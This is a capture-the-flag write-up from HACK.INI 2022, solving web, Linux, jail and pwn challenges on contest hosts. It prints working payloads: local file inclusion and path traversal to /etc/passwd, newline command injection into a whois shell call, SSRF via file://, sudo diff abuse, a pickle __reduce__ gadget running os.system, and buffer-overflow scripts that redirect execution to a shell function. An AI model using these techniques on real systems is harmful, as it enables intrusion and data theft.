# HACK.INI 10th edition 2022

**Author : Aghiles Gharbi**

**TeamName : AnonyBlasBlas**

**Junior : 2nd place**

**Senior : 5th place**

**Individual : 5th**

**team members:**

> Aghiles Gharbi

> Zamoum Amar

> Negazzi Med amine

> Taleb Zineb

> Saradouni Safia

## Web

### baby lfi

> Author : Anis Chebah

> level: so easy

> link : https://baby-lfi.challs.shellmates.club/

    The website has a simple basic lfi (local file inclusion) in the 'language' GET parameter where it just passes the language parameter to include function in php without cheking.

    so the solutuin was just giving the file to read in the language parameter.
> exploit : 'https://baby-lfi.challs.shellmates.club/?language=/etc/passwd'

> flag: shellmates{10CA1_F11e_1Nc1US10n_m4y_r3ve4l_in7Er3st1nG_iNf0Rm4t1on}

### lfi

> Author : Anis Chebah

> level: so easy

> link : 'https://lfi.challs.shellmates.club'

    The website has a simple basic lfi (local file inclusion) in the 'language' GET parameter but in this time they added a filter for (relative paths by removing the '../') where in my case i used the same payload to get the flag because our payload dosn't contain '../'

> exploit : 'https://lfi.challs.shellmates.club/?language=/etc/passwd'

> flag: shellmates{SH0uLD_H4Ve_MadE_th3_checK_recuRS1V3}

### baby lfi 2

> Author : Anis Chebah

> level: so easy

> link : 'https://baby-lfi-2.challs.shellmates.club/'

    The website has a simple lfi (local file inclusion) in the 'language' GET parameter where it passes the language parameter to include function after checking if it contains "./languages/" (my best guess), but this one it was a bit tricky because i "language=languages/" should work without the './'.

    So the solutuin was just giving the file to read in the language parameter.
> exploit : 'https://baby-lfi-2.challs.shellmates.club/?language=./languages/../../../../../../../etc/passwd'

> flag: shellmates{yOU_M4De_yOUr_waY_7hRough_iT}

### HEADache

> Author : Muhammad

> level: so easy

> link : 'https://headache.challs.shellmates.club/'

> file : app.py

    The challenge is simple flask web app, as we can see in the app.py it check for the http header "wanna-something" if it contains "can-i-have-a-flag-please" it just gives us the flag we can add the header from browser inspector or burp suite.

> exploit : add "Wanna-something: can-i-have-a-flag-please" in the http request

> flag : shellmates{hTTp_H34d37R5_&_p0L173N355_c4n_B3_U53FULL}

### Whois 

> Author : souad

> level : medium

> link : 'https://whois.challs.shellmates.club'

    The challenge is a whois online service, where we select a whois host and write a domain name to query, we can see that there is a file named query.php which handles the requests by taking the two GET parameters host and query, if we remove the parameters we get its php source code. Which executes the whois command by the given parametes.

```php
$output = shell_exec("/usr/bin/whois -h ${host} ${query}");
```

    In the code we can see two regex patterns:

```php
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
$query_regex = "/^[0-9a-zA-Z\. ]+$/";
```

    if we read a little bit about the [PRCE modifiers (pattern modifiers)](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) we can see that in php by default the regex matches only the first line, so we can add a line break in the parameter which will execute mutiple commands separated with '\n' which is coded as %0a in the url.

> exploit : 'http:/whois.challs.shellmates.club/query.php?host=xxx%0a&query=cat+flag.txt'

> flag: shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll}

### Whois fixed

    A web-based Whois service
    Note : There was a problem with the first version, this is the fixed version.
> Author : souad

> level : medium

> link : 'https://whois-fixed.challs.shellmates.club'

    In this challenge they just renamed the flag we can notice that by executing 'ls' the flag was just renamed to 'thisistheflagwithrandomstuffthatyouwontguessJUSTCATME' we can just cat it

> exploit : 'https:/whois-fixed.challs.shellmates.club/query.php?host=xxx%0A&query=cat+thisistheflagwithrandomstuffthatyouwontguessJUSTCATME'

> flag : shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll_9837432986534065}

### nextGen 1

    simple monitoring app.

    Note : Flag is in the /flag.txt file of the web server

> Author : souad

> level : easy

> link : 'https://nextgen-1.challs.shellmates.club'

    The challenge was simple monitoring app, we notice that when we click on a departement on the menu a POST request is sent to /request with the parameter service which contains a link (local webserver), hmmm i smell an SSRF (server side request forgery), after somme attempts we can see that there is no filters for file:// so the exploit is just to get the file with file:///flag.txt

> exploit : POST /request with parameters service=file:///flag.txt

> flag : shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}

### nextGen 2 

    We added some filters now.

```python
@app.route("/request", methods=['POST'])
def serve():
    url = request.form['service']
    html = ''
    if search(r'(localhost|127.0.0.1|0.0.0.0)', url) :
        html = render_template("error-404.html")
    else :
        if search(r'[a-z]+://[a-z0-9.-]+/', url):
            with urlopen(url) as response:
                html = response.read()        
            
    return html
```

    Note : Flag is in the /flag.txt file of the web server

> Author : souad
> link : 'https://nextgen-2.challs.shellmates.club'

    the exploit is the same as nextGen 1, they just added some filters

> exploit : POST /request with parameters service=file://hr.dep.nextgen.org/flag.txt

> flag : shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}

## Linux

### diff

> Author : Ouxs

    the challenge is a linux container which contains the flag in the / directory but we don't have permission to read it. i checked for suid binaries but nothing, then i did sudo -l to list the commands that users can execute with sudo, i saw that we can execute diff with sudo with the username ctf-cracked, now we will just diff the flag with any other file to get the flag.

> exploit : sudo -u ctf-cracked diff flag.txt /etc/passwd

> flag : shellmates{You_ma$tered_th3_t00L}

### remote

> Author : Ouxs

    the challenge is a linux container which contains the flag in the / directory but the ssh login script always exits instantly, so the trick is to execute a command before the login script, we can do it with ssh by adding the command as the last argument.

> exploit : ssh ctf@remote -o ProxyCommand="openssl s_client -quiet -connect remote.challs.shellmates.club:443 -servername remote.challs.shellmates.club" "cat /flag.txt"

> flag : shellmates{HOW_DID_U_M4d3_i7_HERE!}

### Welcome

> Author : Ouxs

    the challenge is to find the flag in this linux container, we can see that the welcome message is diffrent comparing to other machines, so the first thing is to find how it is printing this message. after a while we found that the /etc/update-motd/01-custom contains the scripts that print the wellcome message, we can see a commented line contains f379bbf265604f3514cda4aadbc05137

> flag : shellmates{f379bbf265604f3514cda4aadbc05137}



## Jail

### baby jail 1

> Author : Ouxs

    the challenge is a custom python interpreter where we need to open and read the flag file.
> exploit : open("flag.txt").read()

> flag : shellmates{D0n'7_m3$$_W17H_EVAL_kID0}

### baby jail 2

> Author : Ouxs

    the challenge is a custom python interpreter where the added some filters, if we print the globals we can see a BLACKLIST array containig blacklisted words, so i just clear that array then execute the same command of baby jail 1.
> exploit : BLACKLIST.clear() then open("flag.txt").read()

> flag : shellmates{Y0u_ar3_st4rting_t0_g3t_g00d_with_LAVE}

### less_jail

> Author : 1m4D

    in this challenge when we ssh we get a less editor, we need just to execute a shell command by pressing on !, then cat the real flag

> exploit : ! then cat real_flag

> flag : shellmates{My_LE$$_J41L_1S_VERy_We4K_76423}

### pickle_games 1

> Author : chenx3n

    in this challenge they gave us a python script, which it reads a data in hex then deserialize it with pickle so the challenge here is to serialize an object that can lead us to the flag.

```python
#!/usr/bin/env python3
import pickle

def check(data):
    return len(data) <= 400

if __name__ == "__main__":
    print("Welcome to the pickle games! (Level 0)")
    data = bytes.fromhex(input("Enter your hex-encoded pickle data: "))
    if check(data):
        result = pickle.loads(data)
        print(f"Result: {result}")
    else:
        print("Check failed :(")
```

#### try 1

    in the first try i created a class and redefine the __repr__ function which is called everytime we try to print an object.
    but i had a problem that on the server side i get an error of class undefined before we reach the print line, so at this time i was thinking if there is a function that will be executed before the object creation,

```python
class MYClass():
    def __repr__(self):
        return open("flag.txt").read()

import pickle

filename = 'dump'
outfile = open(filename,'wb')

pickle.dump(MYClass(), outfile)
```
#### try 2

    after some research i found the reduce function which was used in a lot of ctfs, i created a class and redefined the __reduce__ method and it WORKS XD.

exploit:
```python
class MYClass():
    def __reduce__(self):
        command = ('cat flag.txt')
        return os.system, (command,)

import pickle

filename = 'dump'
outfile = open(filename,'wb')

pickle.dump(MYClass(), outfile)
```

> flag : shellmates{lEt_thE_piCkl3_gaMeS_BegiN!}


## PWN

### B0F0

> Author : 1m4D

    In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to change the date to 2752022 by using the buffer overflow. so i just coded the number in hex and add it after the bufferoverflow offset.

```python
from pwn import *

payload = 'a' * 128 + "\x16\xfe\x29\x00"

print(payload)

p = process('./challenge')

sep = " \n "

p.sendline(payload)
output = p.recvall()
print(output)
```

> exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x16\xfe\x29\x00" | ncat -v --ssl bof0.challs.shellmates.club 443

> flag : shellamtes{Y0u_H4vE_ChE4ngED_mY_V4R14Ble_98765}


### B0F0

> Author : 1m4D

    In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to ret addr to the open_shell function wich has the addr 0x080491b6 and pass the parameter (int)1337.

```python
from pwn import *

#080491b6
payload = 'a' * 32 + "\xb6\x91\x04\x08" + "aaaa" + "\x39\x05\x00\x00"

print(payload)

p = process('./challenge')

sep = " \n "

p.sendline(payload)
output = p.recvall()
print(output)
```

> exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x91\x04\x08aaaa\x39\x05\x00\x00\ncat flag" | ncat -v --ssl bof1.challs.shellmates.club 443

> flag : shellamtes{Y0u_4lS0_GET_A_$HEll_65431}